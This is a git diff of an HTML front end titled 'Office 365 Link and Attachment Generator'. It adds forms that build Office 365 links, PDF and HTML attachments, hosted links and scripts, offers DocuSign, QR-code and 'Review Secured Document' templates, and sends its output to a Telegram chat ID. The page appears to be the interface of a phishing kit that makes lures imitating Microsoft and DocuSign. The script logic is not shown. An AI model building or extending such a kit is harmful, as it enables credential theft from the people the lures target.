@@ -3,34 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Office 365 Link Generator</title>
+    <title>Office 365 Link and Attachment Generator</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>Office 365 Link Generator</h1>
+    <div class="container">
+        <h1>Office 365 Link and Attachment Generator</h1>
+        
+        <!-- Form for generating Office 365 link -->
+        <form id="linkForm">
+            <h2>Generate Office 365 Link</h2>
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+            <label for="chatId">Telegram Chat ID:</label>
+            <input type="text" id="chatId" name="chatId" required>
+            <button type="submit">Generate Link</button>
+        </form>
+        <div id="linkResult"></div>
+        
+        <!-- Form for generating PDF attachment -->
+        <form id="attachmentForm">
+            <h2>Generate PDF Attachment</h2>
+            <label for="content">Content:</label>
+            <textarea id="content" name="content" required></textarea>
+            <label for="chatIdAttachment">Telegram Chat ID:</label>
+            <input type="text" id="chatIdAttachment" name="chatIdAttachment" required>
+            <button type="submit">Generate PDF</button>
+        </form>
+        <div id="attachmentResult"></div>
+        
+        <!-- Form for generating ready offline attachment -->
+        <form id="offlineAttachmentForm">
+            <h2>Generate Ready Offline Attachment</h2>
+            <label for="offlineContent">Content:</label>
+            <textarea id="offlineContent" name="offlineContent" required></textarea>
+            <label for="chatIdOffline">Telegram Chat ID:</label>
+            <input type="text" id="chatIdOffline" name="chatIdOffline" required>
+            <button type="submit">Generate Offline Attachment</button>
+        </form>
+        <div id="offlineAttachmentResult"></div>
 
-    <form id="linkForm">
-        <label for="email">Enter your email:</label>
-        <input type="email" id="email" name="email" required>
-        <button type="submit">Generate Link</button>
-    </form>
+        <!-- Form for generating scripts code JS and HTML -->
+        <form id="scriptsForm">
+            <h2>Generate Scripts Code (JS and HTML)</h2>
+            <label for="scriptContent">Content:</label>
+            <textarea id="scriptContent" name="scriptContent" required></textarea>
+            <label for="chatIdScripts">Telegram Chat ID:</label>
+            <input type="text" id="chatIdScripts" name="chatIdScripts" required>
+            <button type="submit">Generate Scripts</button>
+        </form>
+        <div id="scriptsResult"></div>
 
-    <div id="linkResult">
-        <!-- Result will be displayed here dynamically -->
+        <!-- Form for generating direct hosted link -->
+        <form id="directLinkForm">
+            <h2>Generate Direct Hosted Link</h2>
+            <label for="hostedLinkContent">Content:</label>
+            <textarea id="hostedLinkContent" name="hostedLinkContent" required></textarea>
+            <label for="chatIdHosted">Telegram Chat ID:</label>
+            <input type="text" id="chatIdHosted" name="chatIdHosted" required>
+            <button type="submit">Generate Hosted Link</button>
+        </form>
+        <div id="directLinkResult"></div>
+
+        <!-- Section to select attachment templates -->
+        <h2>Select Attachment Template</h2>
+        <select id="templateSelect">
+            <option value="qrCode">QR Code Template</option>
+            <option value="docusign">DocuSign Template</option>
+            <option value="reviewSecured">Review Secured Document Template</option>
+            <option value="basic">Normal Basic Template</option>
+        </select>
+        <label for="chatIdTemplate">Telegram Chat ID:</label>
+        <input type="text" id="chatIdTemplate" name="chatIdTemplate" required>
+        <button id="sendTemplateBtn">Send Template to Telegram</button>
+        <div id="templateResult"></div>
+
+        <!-- Form for generating HTML attachment -->
+        <form id="htmlAttachmentForm">
+            <h2>Generate HTML Attachment</h2>
+            <label for="htmlContent">Content:</label>
+            <textarea id="htmlContent" name="htmlContent" required></textarea>
+            <label for="chatIdHtml">Telegram Chat ID:</label>
+            <input type="text" id="chatIdHtml" name="chatIdHtml" required>
+            <button type="submit">Generate HTML</button>
+        </form>
+        <div id="htmlAttachmentResult"></div>
     </div>
-
-    <script src="script.js"></script>
-</body>
-</html>
-
-<h1>Office 365 Link Generator</h1>
-<form id="emailForm">
-    <label for="emailInput">Enter your email:</label>
-    <input type="email" id="emailInput" placeholder="example@example.com" required>
-    <button type="button" onclick="handleGenerateLink()">Generate Office 365 Link</button>
-</form>
-<div id="resultContainer"></div>
-
-<!-- Existing closing tags -->
+    <script src="scripts.js"></script>
 </body>
 </html>
